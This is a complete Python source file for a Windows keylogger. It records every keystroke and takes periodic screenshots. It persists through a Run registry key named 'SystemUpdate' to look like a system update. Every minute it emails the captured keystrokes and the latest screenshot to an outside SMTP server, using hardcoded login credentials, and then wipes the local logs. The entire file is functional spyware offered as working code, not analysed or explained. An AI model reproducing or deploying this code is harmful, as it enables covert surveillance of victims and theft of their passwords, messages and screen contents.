import os
import sys
import threading
import traceback
import smtplib
import pyautogui
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard
import winreg

# === CONFIG ===
LOG_FILE = os.path.join(os.getenv('APPDATA'), 'keylog.txt')
SCREENSHOT_DIR = os.path.join(os.getenv('USERPROFILE'), 'Downloads', 'scrnshots')
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

EMAIL_ADDRESS = 'log@yourdomain.com'
SMTP_HOST = 'sandbox.smtp.mailtrap.io'
SMTP_PORT = 587
SMTP_USER = '36c6dc4d1bd376'
SMTP_PASS = '930572493ba13f'

SEND_INTERVAL = 60  # seconds

DEBUG_LOG_FILE = os.path.join(os.getenv('APPDATA'), 'debug_log.txt')

# === DEBUG LOGGER ===
def log_debug(message):
    try:
        with open(DEBUG_LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now()}] {message}\n")
    except Exception:
        pass  # Fail silently if debug logging breaks

# === STARTUP PERSISTENCE ===
def add_to_startup():
    try:
        exe_path = os.path.realpath(sys.executable if getattr(sys, 'frozen', False) else __file__)
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
        log_debug("Added to startup.")
    except Exception:
        log_debug("Startup persistence error:\n" + traceback.format_exc())

# === KEYLOGGER ===
def on_press(key):
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{datetime.now().strftime('%H:%M:%S')} - {repr(key.char)}\n")
    except AttributeError:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"{datetime.now().strftime('%H:%M:%S')} - [{key}]\n")

# === SCREENSHOT ===
def take_screenshot():
    try:
        filename = f'screen_{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}.png'
        filepath = os.path.join(SCREENSHOT_DIR, filename)
        screenshot = pyautogui.screenshot()
        screenshot.save(filepath)
        log_debug(f"Screenshot saved: {filepath}")
    except Exception:
        log_debug("Screenshot failed:\n" + traceback.format_exc())

def screenshot_loop():
    take_screenshot()
    threading.Timer(SEND_INTERVAL, screenshot_loop).start()

# === SEND EMAIL ===
def send_logs():
    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r', encoding='utf-8') as file:
                content = file.read()

            if content.strip():
                msg = MIMEMultipart()
                msg['Subject'] = 'Keylogger Report'
                msg['From'] = EMAIL_ADDRESS
                msg['To'] = EMAIL_ADDRESS

                msg.attach(MIMEText("Attached are the latest keystrokes and screenshot.", "plain"))
                msg.attach(MIMEText(content, 'plain'))

                screenshots = sorted(os.listdir(SCREENSHOT_DIR))
                if screenshots:
                    latest = screenshots[-1]
                    screenshot_path = os.path.join(SCREENSHOT_DIR, latest)
                    with open(screenshot_path, 'rb') as file:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(file.read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', f'attachment; filename={latest}')
                        msg.attach(part)
                    log_debug(f"Attached screenshot: {latest}")

                server = smtplib.SMTP(SMTP_HOST, SMTP_PORT)
                server.starttls()
                server.login(SMTP_USER, SMTP_PASS)
                server.send_message(msg)
                server.quit()
                log_debug("[+] Email sent successfully.")

                # Clear logs and screenshots after sending
                with open(LOG_FILE, 'w', encoding='utf-8') as file:
                    file.write('')
                for scr in os.listdir(SCREENSHOT_DIR):
                    os.remove(os.path.join(SCREENSHOT_DIR, scr))
                log_debug("Cleared keylog and screenshots after sending.")
            else:
                log_debug("Log file empty — nothing to send.")
    except Exception:
        log_debug("Email send failed:\n" + traceback.format_exc())

    threading.Timer(SEND_INTERVAL, send_logs).start()

# === MAIN ===
def main():
    log_debug("=== Keylogger started ===")
    add_to_startup()

    screenshot_loop()
    send_logs()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
